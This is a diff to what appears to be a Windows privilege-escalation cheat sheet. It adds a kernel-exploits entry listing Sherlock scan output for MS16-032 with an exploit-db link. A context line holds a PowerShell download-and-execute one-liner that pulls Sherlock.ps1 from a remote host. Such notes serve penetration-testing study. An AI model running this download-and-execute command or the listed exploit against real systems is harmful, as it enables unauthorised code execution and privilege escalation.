@@ -191,6 +191,19 @@ IEX(New-Object Net.Webclient).downloadString('http://10.10.10.10/Sherlock.ps1')
 
 ## 
 
+## Windows Kernel Exploits
+
+
+### MS16-032
+```
+Title      : Secondary Logon Handle
+MSBulletin : MS16-032
+CVEID      : 2016-0099
+Link       : https://www.exploit-db.com/exploits/39719/
+VulnStatus : Appears Vulnerable
+```
+
+
 *Easy*
 
 **Passwords**
